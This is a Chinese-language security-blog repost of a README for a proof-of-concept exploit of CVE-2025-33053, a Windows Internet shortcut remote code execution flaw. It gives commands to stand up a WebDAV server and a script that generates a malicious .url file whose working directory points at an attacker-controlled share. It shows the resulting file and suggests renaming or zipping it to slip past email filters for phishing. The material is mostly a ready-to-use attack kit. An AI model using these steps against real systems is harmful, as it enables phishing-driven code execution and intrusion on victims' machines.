> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247531295&idx=1&sn=eb0ef566f205a850da5af7a89d54fbc7

#  Internet 快捷方式文件远程代码执行漏洞 CVE-2025-33053 概念验证（PoC）  
 Ots安全   2025-06-24 12:26  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taeBPuV8xNIutx8uv43Qwicaj5I9WEHdpWQJNorhj6OHxrLQjKiaPQs8H1NNEVWZtib5WQmzBeJNVNz7A/640?wx_fmt=jpeg&from=appmsg "")  
  
该存储库提供脚本，用于使用 Apache2 在 Ubuntu 上自动部署 WebDAV 服务器，并生成用于网络钓鱼、红队或横向移动模拟的恶意.url快捷方式文件。  
  
📁 内容  
- setup_webdav.sh– 用于配置 Apache2 + WebDAV 的 Bash 脚本。  
  
- setup_webdav.py– 上述的 Python 版本。  
  
- gen_url.py.url–使用 UNC/WebDAV 路径生成快捷方式文件的 Python 脚本。  
  
- README.md– 文档。  
  
🔧 要求  
- 操作系统：Ubuntu 20.04 或更新版本（兼容 Debian）  
  
- Root 权限（sudo）  
  
- Python 3.x  
  
🚀 设置说明  
  
1. WebDAV 服务器（通过 Bash）  
  

```
sudo bash setup_webdav.sh
```

  
  
或者使用 Python：  
  

```
sudo python3 setup_webdav.py
```

  
  
默认情况下，脚本将：  
- 安装 Apache 和所需的 WebDAV 模块。  
  
- 在 处创建共享目录/var/www/webdav。  
  
- 启用DAV和DAV_FS模块。  
  
- 创建一个DavLockDB目录（以防止 Apache DAV 锁定错误）。  
  
- 重新启动 Apache 服务。  
  
📎 WebDAV 路径：http://<your-ip>/webdav/  
  
💣 生成恶意.url快捷方式  
  
使用示例：  
  

```
python3gen_url.py--ip 192.168.1.100--outdoc.url
```

  
  
所有选项：  
  

```
python3 gen_url.py \

--ip 《YOUR IP ADDRESS》\

--share 《YOUR SHARE NAME》(Default: webdav) \

--out 《YOUR OUTPUT FILENAME.url》(Default: bait.url) \

--exe &#34;C:\Program Files\Internet Explorer\iediagcmd.exe&#34; \

--icon &#34;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe&#34; \

--index 13 \

  --modified 20F06BA06D07BD014D
```

  
  
这将创建一个.url如下文件：  
  

```
[InternetShortcut]

URL=C:\Program Files\Internet Explorer\iediagcmd.exe

WorkingDirectory=\\192.168.1.100\webdav\

ShowCommand=7

IconIndex=13

IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe

Modified=20F06BA06D07BD014D
```

  
  
📌 单击此文件（在某些配置中）可能会导致目标系统自动连接到您的 WebDAV 服务器（身份验证或 DLL 传送）。  
  
🔒 安全测试注意事项  
- 如果在本地网络上测试， 请禁用防火墙（或打开端口 80） ：  
  

```
sudo ufw allow 80
```

  
- .url文件可能无法按预期执行，具体取决于：  
  
- 组策略限制  
  
- 应用程序默认值  
  
- 电子邮件客户端（Gmail 可能会对其进行清理）  
  
- 您可能需要压缩或重命名.url以.txt绕过过滤器。  
  
项目地址：  
  
https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept  
  
为了您的计算机安全，请在虚拟环境上测试  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
